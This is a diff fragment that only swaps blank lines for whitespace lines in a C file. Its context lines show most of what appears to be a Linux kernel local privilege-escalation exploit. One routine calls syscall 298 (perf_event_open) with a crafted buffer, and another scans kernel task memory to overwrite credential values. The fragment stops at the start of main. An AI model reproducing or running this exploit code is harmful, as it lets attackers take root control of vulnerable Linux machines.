@@ -8,12 +8,12 @@
 #include <syscall.h>
 #include <stdint.h>
 #include <assert.h>
-
+ 
 #define BASE  0x380000000
 #define SIZE  0x010000000
 #define KSIZE  0x2000000
 #define AB(x) ((uint64_t)((0xababababLL<<32)^((uint64_t)((x)*313337))))
-
+ 
 void fuck() {
   int i,j,k;
   uint64_t uids[4] = { AB(2), AB(3), AB(4), AB(5) };
@@ -21,7 +21,7 @@ void fuck() {
   uint64_t kbase = ((uint64_t)current)>>36;
   uint32_t *fixptr = (void*) AB(1);
   *fixptr = -1;
-
+ 
   for (i=0; i<4000; i+=4) {
     uint64_t *p = (void *)&current[i];
     uint32_t *t = (void*) p[0];
@@ -34,14 +34,14 @@ void fuck() {
 next:;    }
   }
 }
-
+ 
 void sheep(uint32_t off) {
   uint64_t buf[10] = { 0x4800000001,off,0,0,0,0x300 };
   int fd = syscall(298, buf, 0, -1, -1, 0);
   assert(!close(fd));
 }
-
-
+ 
+ 
 int  main() {
   uint64_t  u,g,needle, kbase, *p; uint8_t *code;
   uint32_t *map, j = 5;
